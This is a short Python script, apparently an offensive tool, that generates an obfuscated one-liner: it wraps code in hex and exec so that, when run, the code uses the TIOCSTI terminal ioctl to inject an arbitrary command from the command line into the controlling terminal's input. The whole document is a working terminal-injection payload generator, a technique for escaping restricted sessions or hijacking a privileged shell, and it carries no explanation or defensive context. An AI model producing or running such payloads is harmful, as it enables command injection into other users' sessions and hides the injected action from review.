import sys

CODE_TEMPLATE = \
"""
import fcntl, termios, sys
PAYLOAD={}
for c in PAYLOAD:
    fcntl.ioctl(1, termios.TIOCSTI, c.encode())
sys.exit()
"""

payload = sys.argv[1] + '\n'
print('exec(bytes.fromhex("{}").decode())'.format(CODE_TEMPLATE.format(repr(payload)).encode().hex()))
